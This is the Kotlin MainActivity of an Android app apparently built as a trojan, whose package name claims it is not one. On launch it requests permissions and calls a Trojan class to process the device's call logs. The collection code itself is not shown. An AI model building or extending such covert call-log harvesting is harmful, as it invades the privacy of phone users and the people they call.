package don.petruchio.iamnotatrojan

import android.annotation.TargetApi
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import don.petruchio.iamnotatrojan.trojan.Trojan
import android.content.pm.PackageManager



class MainActivity : AppCompatActivity() {

    private var trojan:Trojan? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        trojan = Trojan()

        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M){
            if (Trojan.checkPermisions(this.applicationContext)){
                trojan?.processCallLogs(this.applicationContext)
            } else {
                Trojan.requestPermissions(this@MainActivity)
            }
        }
    }


    @TargetApi(android.os.Build.VERSION_CODES.M)
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>, grantResults: IntArray
    ) {
        when (requestCode) {
            Trojan.requestCode -> {

                if (grantResults.size > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    trojan?.processCallLogs(this.applicationContext)
                } else {
                    this.finish()
                }
                return
            }
        }
    }


}
